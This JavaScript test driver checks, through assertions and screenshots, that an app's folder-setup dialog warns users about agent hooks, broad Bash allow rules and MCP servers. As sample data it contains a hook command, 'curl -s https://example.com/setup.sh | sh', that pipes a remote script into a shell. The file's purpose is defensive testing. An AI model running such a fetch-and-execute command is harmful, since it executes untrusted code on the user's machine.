/*
 * Spec 061: the folder-setup dialog in the simulator (`simfoldersetup=1`: the first agent's folder brings three hooks (one too long for
 * its box), three rules, two MCP servers (one hidden with a reason) and an unsupported Codex hook). No real agent app, no credits. Linux with xvfb-run:
 *
 *   npm run build
 *   OUT=docs/screenshots DURBAR_USER_DATA=$(mktemp -d) DURBAR_SIM=15 DURBAR_SIM_FREEZE=1 \
 *     DURBAR_DRIVER=$PWD/scripts/shots-061-foldersetup.js xvfb-run -a npx electron . --no-sandbox
 *
 * Checks: the dialog opens by itself for that folder, lists every item in full, marks the broad rules (both Bash allow rules, S1) and the unsupported Codex hook,
 * explains a hook on demand (advisory, with its source), says
 * "scroll inside the box" on the long hook only, says why the hidden MCP server is hidden (unticked), keeps hooks off without the confirmation, applies with it, shows
 * "+ folder rules" on the mode chip, and reopens from the mode menu. Text is at least 10.5px and fits the dialog.
 */
const assert = require('assert');
const path = require('path');
const { helpers, jsLiteral } = require('./driver-helpers');
const OUT = process.env.OUT || '/tmp';

module.exports = async (ctx) => {
  const js = (c) => ctx.js(c);
  const HP = helpers(ctx); // spec 008 FR-097: shared plumbing
  const shot = async (name, w, h) => { await ctx.sleep(200); await ctx.shot(path.join(OUT, `061-${name}-${w}x${h}.png`)); };
  for (const [w, h] of [[1440, 900], [1280, 800]]) {
    await HP.load({ w, h, query: { simfoldersetup: '1' }, settle: false });
    // FR-001: it opens by itself for the folder with pending items
    await ctx.waitFor(`!!document.querySelector('#scrDlg .dlg.fs')`, 8000);
    const v = await js(`(()=>{const d=document.querySelector('#scrDlg .dlg.fs');const R=d.getBoundingClientRect();
      const small=[...d.querySelectorAll('*')].filter(e=>e.children.length===0&&e.textContent.trim()&&e.getClientRects().length&&parseFloat(getComputedStyle(e).fontSize)<10.5).map(e=>e.className||e.tagName);
      return {title:d.querySelector('#scrDlgT').textContent,rows:d.querySelectorAll('[data-fs]').length,checked:d.querySelectorAll('[data-fs]:checked').length,disabled:d.querySelectorAll('[data-fs]:disabled').length,
        broad:[...d.querySelectorAll('.mtag.warn')].map(x=>x.textContent),curl:d.textContent.includes('curl -s https://example.com/setup.sh | sh'),
        note:/without asking you, even in Read-only/.test(d.textContent),confirm:!!d.querySelector('#fsHooksOk'),inside:R.right<=innerWidth&&R.bottom<=innerHeight+1,small}})()`);
    assert.strictEqual(v.title, 'This folder brings its own agent setup');
    assert.strictEqual(v.rows, 9, `${w}: every item listed`);
    assert.strictEqual(v.disabled, 1, 'the Codex hook is shown as not supported');
    assert.strictEqual(v.checked, 5, 'Q1: on by default, except the unsupported one, the hidden MCP server and the two Bash allow rules (S1, owner 2026-10-21: every Bash rule needs the explicit tick)');
    assert.ok(await js(`!document.querySelector(${jsLiteral(`#scrDlg [data-fs="${'c'.repeat(32)}"]`)}).checked`), 'S1: Bash(npm test:*) starts unticked too');
    assert.ok(await js(`!document.querySelector(${jsLiteral(`#scrDlg [data-fs="${'d'.repeat(32)}"]`)}).checked`), 'S1: the broad allow rule (Bash) starts unticked');
    assert.ok(await js(`/hooks and broad allow rules/.test(document.querySelector('#scrDlg .fs-confirm').textContent)`), 'the tick names the broad allow rules too');
    assert.ok(v.broad.includes('broad'), 'the broad rule is marked');
    assert.ok(v.curl && v.note && v.confirm, 'the exact command, the plain warning, the hooks confirmation');
    assert.ok(v.inside, `${w}: the dialog fits the window`);
    assert.deepStrictEqual(v.small, [], `${w}: no text under 10.5px`);
    // the confirmation tick sits inline at the start of its text: box centre within the text's first line, box to its left
    const ck = await js(`(()=>{const l=document.querySelector('#scrDlg .fs-confirm');const b=l.querySelector('#fsHooksOk').getBoundingClientRect();
      const r=document.createRange();r.selectNodeContents(l.querySelector('span'));const f=r.getClientRects()[0];const cy=(b.top+b.bottom)/2;
      return {cy,top:f.top,bottom:f.bottom,boxRight:b.right,textLeft:f.left,lines:Math.round(l.querySelector('span').getBoundingClientRect().height/f.height)}})()`);
    assert.ok(ck.cy >= ck.top && ck.cy <= ck.bottom && ck.boxRight <= ck.textLeft, `${w}: the confirmation box is inline before its first line: ${JSON.stringify(ck)}`);
    await shot('dialog', w, h);
    // FR-015: an AI explanation on demand, advisory, with its source
    await js(`[...document.querySelectorAll('#scrDlg [data-explain]')].find(b=>b.closest('.fs-row').textContent.includes('curl')).click()`);
    await ctx.waitFor(`!!document.querySelector('#scrDlg .fs-ai.v-risky')`, 5000);
    const ai = await js(`document.querySelector('#scrDlg .fs-ai.v-risky').textContent`);
    assert.ok(/^Risky/.test(ai) && /it can be wrong/.test(ai) && /The command above is what runs/.test(ai), 'advisory explanation: ' + ai);
    await js(`document.querySelector('#scrDlg .fs-ai.v-risky').scrollIntoView({block:'center'})`);
    await shot('explained', w, h);
    // re-review #424: a command too long for its box says "scroll to read all"; a short one does not
    const more = await js(`(()=>{const d=document.querySelector('#scrDlg .dlg.fs');const c=d.querySelector('.fs-cmd');const t=c.textContent;
      const before=d.querySelectorAll('.fs-more').length;c.textContent=t+'\\n'.repeat(40)+'tail';window.DurbarFolderSetup.markLong(d);const long=d.querySelectorAll('.fs-more').length;
      const hint=(c.nextElementSibling||{}).textContent||'';c.textContent=t;window.DurbarFolderSetup.markLong(d);return {before,long,hint,after:d.querySelectorAll('.fs-more').length}})()`);
    assert.deepStrictEqual([more.before, more.long, more.after], [1, 2, 1], `${w}: the scroll hint only on a long command: ${JSON.stringify(more)}`);
    assert.ok(/scroll inside the box to read all/.test(more.hint));
    // T053: the sample's long Stop hook carries the hint (and only it); the box and the hint do not overlap
    const lg = await js(`(()=>{const r=[...document.querySelectorAll('#scrDlg .fs-row')].find(x=>x.textContent.includes('Stop hook'));r.scrollIntoView({block:'center'});
      const c=r.querySelector('.fs-cmd'),m=r.querySelector('.fs-more');const D=document.querySelector('#scrDlg .dlg.fs').getBoundingClientRect();
      const C=c.getBoundingClientRect(),M=m&&m.getBoundingClientRect();
      return {hint:m&&m.textContent,next:c.nextElementSibling===m,clear:!!M&&M.top>=C.bottom-0.5,inside:!!M&&M.right<=D.right&&M.left>=D.left,scrolls:c.scrollHeight>c.clientHeight,
        others:[...document.querySelectorAll('#scrDlg .fs-more')].filter(x=>!r.contains(x)).length,size:m&&parseFloat(getComputedStyle(m).fontSize)}})()`);
    assert.ok(lg.next && lg.scrolls && /^Long: scroll inside the box to read all of it\.$/.test(lg.hint), `${w}: the long hook says scroll: ${JSON.stringify(lg)}`);
    assert.ok(lg.clear && lg.inside && lg.size >= 10.5 && lg.others === 0, `${w}: hint placed under its box, readable, only once: ${JSON.stringify(lg)}`);
    await shot('long', w, h);
    // T053: the MCP server that starts a shell with env values says why it is hidden and starts unticked
    const hd = await js(`(()=>{const r=[...document.querySelectorAll('#scrDlg .fs-row')].find(x=>x.textContent.includes('MCP server notes'));r.scrollIntoView({block:'center'});
      const t=r.querySelector('.fs-hidden'),T=t.getBoundingClientRect(),C=r.querySelector('.fs-cmd').getBoundingClientRect(),D=document.querySelector('#scrDlg .dlg.fs').getBoundingClientRect();
      return {text:t.textContent,checked:r.querySelector('[data-fs]').checked,clear:T.top>=C.bottom-0.5,inside:T.right<=D.right&&T.left>=D.left,size:parseFloat(getComputedStyle(t).fontSize),
        count:document.querySelectorAll('#scrDlg .fs-hidden').length}})()`);
    assert.ok(/^It starts sh, which can run what it is given, and hands it env values \(NOTES_FLAGS\): they can be commands, so read them above/.test(hd.text) && /Ticking it runs them too\.$/.test(hd.text), `${w}: the reason is shown: ${hd.text}`);
    assert.ok(await js(`document.querySelector(${jsLiteral(`#scrDlg [data-fs="${'1'.repeat(32)}"]`)}).closest('li').textContent.includes("NOTES_FLAGS=--quiet sh -c 'node")`), `${w}: the env value is shown before the command, args quoted`);
    assert.ok(!hd.checked && hd.clear && hd.inside && hd.size >= 10.5 && hd.count === 1, `${w}: hidden server unticked, reason under its box: ${JSON.stringify(hd)}`);
    assert.ok(await js(`(()=>{const li=document.querySelector(${jsLiteral(`#scrDlg [data-fs="${'f'.repeat(32)}"]`)}).closest('li');return li.textContent.includes('GITHUB_TOKEN=[hidden] LOG_LEVEL=info npx')&&li.textContent.includes('Value hidden (the name looks secret): GITHUB_TOKEN.')})()`), `${w}: a secret-named env value is hidden and says so; a plain one is shown`);
    await shot('hidden', w, h);
    // FR-011: Use these without the confirmation: hooks stay off, rules and servers are used
    await js(`[...document.querySelectorAll('#scrDlg .dbtn .btn')].find(b=>b.textContent==='Use these').click()`);
    await ctx.waitFor(`!document.querySelector('#scrDlg')`, 5000);
    // reopen from the mode menu (FR-005) on the first agent
    await js(`document.querySelector('#stage .desk[data-id="sim-1"]').click()`);
    await ctx.waitFor(`!!document.getElementById('modeChip')`, 5000);
    const chip1 = await js(`document.getElementById('modeChip').textContent`);
    // S1 (owner 2026-10-21): both sample allow rules are Bash rules, so without the tick no allow rule is used and the chip stays plain
    assert.ok(!/\+ folder rules/.test(chip1), 'S1: no tick, no folder allow rule, the chip says plain Read-only: ' + chip1);
    await js(`document.getElementById('modeChip').click()`);
    await ctx.waitFor(`!!document.querySelector('#modeMenu [data-act="foldersetup"]')`, 3000);
    await shot('menu', w, h);
    await js(`document.querySelector('#modeMenu [data-act="foldersetup"]').click()`);
    await ctx.waitFor(`!!document.querySelector('#scrDlg .dlg.fs')`, 5000);
    const hooksOn = await js(`[...document.querySelectorAll('#scrDlg [data-kind="hook"]')].filter(c=>c.checked&&!c.disabled).length`);
    assert.strictEqual(hooksOn, 0, 'the hooks were recorded off (no confirmation), so they show unticked now');
    // tick everything plus the confirmation: hooks are accepted
    await js(`document.querySelectorAll('#scrDlg [data-fs]:not(:disabled)').forEach(c=>{c.checked=true;});document.getElementById('fsHooksOk').click()`);
    await js(`[...document.querySelectorAll('#scrDlg .dbtn .btn')].find(b=>b.textContent==='Use these').click()`);
    await ctx.waitFor(`!document.querySelector('#scrDlg')`, 5000);
    await ctx.sleep(200);
    const chipOn = await js(`document.getElementById('modeChip').textContent`);
    assert.ok(/\+ folder rules/.test(chipOn), 'FR-012: hooks and allow rules on with the tick: the chip says so: ' + chipOn);
    await shot('chip', w, h);
    await js(`document.getElementById('modeChip').click()`);
    await ctx.waitFor(`!!document.querySelector('#modeMenu [data-act="foldersetup"]')`, 3000);
    await js(`document.querySelector('#modeMenu [data-act="foldersetup"]').click()`);
    await ctx.waitFor(`!!document.querySelector('#scrDlg .dlg.fs')`, 5000);
    const after = await js(`[...document.querySelectorAll('#scrDlg [data-kind="hook"]')].filter(c=>c.checked&&!c.disabled).length`);
    assert.strictEqual(after, 3, 'with the confirmation all three hooks are on');
    // Turn all off
    await js(`[...document.querySelectorAll('#scrDlg .dbtn .btn')].find(b=>b.textContent==='Turn all off').click()`);
    await ctx.waitFor(`!document.querySelector('#scrDlg')`, 5000);
    await ctx.sleep(200);
    const chip2 = await js(`document.getElementById('modeChip').textContent`);
    assert.ok(!/folder rules/.test(chip2), 'all off: the chip is back to the plain mode');
  }
  console.log('[061] PASS');
};
